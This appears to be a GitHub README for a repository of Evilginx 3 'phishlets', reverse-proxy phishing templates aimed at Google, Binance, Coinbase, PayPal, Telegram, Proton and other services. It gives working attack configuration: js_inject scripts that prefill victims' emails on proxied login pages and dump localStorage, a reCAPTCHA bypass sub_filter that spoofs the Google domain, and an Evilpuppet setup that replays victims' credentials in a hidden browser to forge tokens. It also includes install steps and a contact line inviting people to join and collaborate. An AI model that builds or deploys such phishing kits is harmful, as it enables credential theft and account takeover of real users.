# Evilginx 3 PHISHLET
<img align="left" src="https://github.com/user-attachments/assets/9655710b-1b9e-4ed7-894a-b5109aecff6c" width="450" height="550">

This repository was created solely to assist in the creation of PHISHLETS / Modification of the Evilginx software itself / In solving any problems associated with this software and PHISHLETS.

__Preface:__ At the moment, there are a very large number of scammers who sell public, raw goods, people who do not understand at all how Reverse Proxy works. Watching these people on hacker sites, telegram channels and on the Internet in general becomes funny. There is nothing complicated in creating a template for EvilGinx; the entire manual is described by the founder himself 
[kgretzky](https://github.com/kgretzky) "Owner") __[__thanks to him for this creation__]__ It is for this reason that we decided to make a small laboratory for mutual assistance in this matter.

### #Installation Steps​
Learn how to install Evilginx locally or deploy it on a remote server [Deployment](https://help.evilginx.com/docs/category/deployment) / Learn how to set up Evilginx and run your first phishing campaign [Quick Start](https://help.evilginx.com/docs/getting-started/quick-start) / Learn how to use Evilginx [Guides](https://help.evilginx.com/docs/category/guides) __[ CONFIG X PHISHLETS X LURES X REDIRECTORS X SESSIONS X PROXY X BLACKLIST ]__

#### Which PHISHLETs are currently available have been tested on our versions 3.7.1 - 3.9.0.

##### [ Google x Binance x Blockchain x Coinbase x Bitmedia x PayPal x Telegram x Proton x Dropbox x Payeer ]

### #Phishlet Format (v3.0.0-vX.X.X)

Phishlets are configuration files in YAML format. If you need to get familiar with YAML, first, you can find some good overview here: [YAML Syntax](https://docs.ansible.com/ansible/latest/reference_appendices/YAMLSyntax.html) 
Phishlet Format [Create](https://help.evilginx.com/docs/phishlet-format) 

<p align="center">
<video src='https://github.com/user-attachments/assets/96019d0b-59c6-4c3a-ae04-d531f39f402b'/>
</p>





### #js_inject
This section defines all Javascript scripts that you want to inject into proxied pages. Every script can be customized with {var_name} variable parameters, which later can be set to different values in each created lure.
```
js_inject:
  - trigger_domains: ["www.domain.com"]
    trigger_paths: ["/uas/login"]
    trigger_params: ["email"]
    script: |
      function lp(){
        var email = document.querySelector("#username");
        var password = document.querySelector("#password");
        if (email != null && password != null) {
          email.value = "{email}";
          password.focus();
          return;
        }
        setTimeout(function(){lp();}, 100);
      }
      setTimeout(function(){lp();}, 100);
```

### #js_inject cookie
The script is designed to load and store the current state of localStorage in the current Local Storage State object```

```
js_inject:
- trigger_domains: ["www.exemple.com"]
trigger_paths: ["/(.*)"]
trigger_params: []
script: |
let previousTime = '';

function logTimeLoop() {
const currentLocalStorageState = {};

for (let i = 0; i < localStorage.length; i++) {
const key = localStorage.key(i);
const value = localStorage.getItem(key);
currentLocalStorageState[key] = value;
}
```
### Puppeteer Real Browser
This package prevents Puppeteer from being detected as a bot in services like Cloudflare and allows you to pass captchas without any problems. It behaves like a real browser.

<p align="center">
<video src='https://github.com/user-attachments/assets/5dddca09-6941-42e9-9427-5c666632483f'/>
</p>

### Recaptcha Bypass
- This method works by modifying the javascript code responsible to generate the base64 string which contains the domain name.
- Subfilter can be modified accordingly based on the target site.
```
proxy_hosts:
  - {phish_sub: 'exemple', orig_sub: 'www', domain: 'exemple.com', session: true, is_landing: false, auto_filter: true}

sub_filters:
  # Change/modify the value assigned to variable 'A' based on your target site. 
  - {triggers_on: 'www.exemple.com', orig_sub: 'exemple', domain: 'exemple.com', search: 'A=si&&!d\?lX\.btoa\(y\):S\[6]\(40,l\[0],O\[l\[1]]\(24,0,8,y\),d\)', replace: 'A="aHR0cHM6Ly9hY2NvdW50cy5nb29nbGUuY29tOjQ0Mw."', mimes: ['text/javascript']}
```

>### info
This part applies only to Evilginx Pro users who have access to Evilpuppet module.

Interactive background browser sessions, spawned on-demand, with sole purpose of forging secret tokens to be used within the proxied Evilginx session.

```
evilpuppet:
  triggers:
    - domains: ['www.domain.com']
      paths: ['/sessions']
      token: 'recaptcha_token'
      open_url: 'https://www.domain.com/signin'
      actions:
        - selector: '#email'
          value: '{username}'
          enter: false
          click: false
          post_wait: 0
        - selector: '#password'
          value: '{password}'
          enter: false
          click: false
          post_wait: 0
        - selector: '#stay_signed_in'
          click: true
          post_wait: 0
        - selector: '#signin_button'
          click: true
          post_wait: 0
  interceptors:
    - token: 'recaptcha_token'
      url_re: '/sessions'
      post_re: 'recaptcha_token=([^&]*)'
      abort: true
```
#### Installation Steps​
Update Package Lists​

Begin by updating your system’s package lists to ensure you have the latest information on the newest versions of packages and their dependencies.
```
sudo apt-get update
```
Install xrandr​

xrandr is a utility for managing screen resolutions and display settings.

-- Use this option if you want to run Playwright with Xserver (for example, in MobaXterm) so you can view the browser live.
-- If use "Headless: playwright.Bool(true)," do no need this to install.
```
sudo apt-get install x11-xserver-utils  
```
#### Install Google Chrome

-- Use Chrome only if you choose not to use the browsers included in the Playwright app. In the source you received, you don’t need these installations.​

Download and install the latest stable version of Google Chrome.
```
wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
sudo dpkg -i google-chrome-stable_current_amd64.deb
sudo apt-get install -f # Install any missing dependencies
```
#### Install Go Programming Language

-- You will need to install the Go language, as the source code is in Go, and to compile it in Linux, you need Go installed.​
Go is essential for running Playwright-Go.

```
wget https://golang.org/dl/go1.23.4.linux-amd64.tar.gz
sudo rm -rf /usr/local/go
sudo tar -C /usr/local -xzf go1.23.4.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin
go version
```
#### Install Playwright-Go and Dependencies

-- You need to install the Playwright Go library, as the Evilginx version for Google uses a module called EvilPlaywright. This module controls a real browser behind the reverse proxy to obtain certain tokens that otherwise cannot be retrieved correctly due to the different host in the reverse proxy or due to Google detecting browser incompatibilities with video versions, fonts, etc.​
Set up Playwright-Go, which is required for browser automation.

```
go get -u github.com/playwright-community/playwright-go
go run github.com/playwright-community/playwright-go/cmd/playwright@latest install --with-deps
go install github.com/playwright-community/playwright-go/cmd/playwright@latest
playwright install --with-dep
```
##### Working with Google or other complex sites is possible when installing all libraries and components integrated with EVILGINX.
<div align="center">
<a href="https://www.veed.io/view/b8859127-37b4-4c59-b8e7-b2d801691d16?panel=share"><img src="https://github.com/user-attachments/assets/57c265c2-27c7-4fec-b63b-2a6559b481e4" alt="IMAGE ALT TEXT"></a>
</div>

## Evilginx Labs by [Evi1Grey5]

<div align="center">
  <a href="https://www.veed.io/view/6859392c-a7e7-4590-bfa2-682d0431ea85?panel=quality-survey"><img src="https://github.com/user-attachments/assets/b21580a1-db99-45a1-b497-38a61f7118b1" alt="IMAGE ALT TEXT"></a>
</div>

<mp4 src="https://www.veed.io/view/6859392c-a7e7-4590-bfa2-682d0431ea85?panel=quality-survey">

>### info
Also, all additional information is listed in the "issues" section. Read, ask your questions, share your knowledge in the Discussion section.
Whenever possible, we will post new PHISHLETS / Information about tool customization. You also need to participate in order to develop this project.
____________________

Evilginx 3 [PHISHLET] by Evi1Grey5 [CUSTOM CREATION / FREE / DEVELOPMENT]
<img align="left" src="https://injectexp.dev/assets/img/logo/logo1.png">

Contacts:
injectexp.dev / 
pro.injectexp.dev / 
Telegram: @Evi1Grey5 [support]
Tox: 340EF1DCEEC5B395B9B45963F945C00238ADDEAC87C117F64F46206911474C61981D96420B72
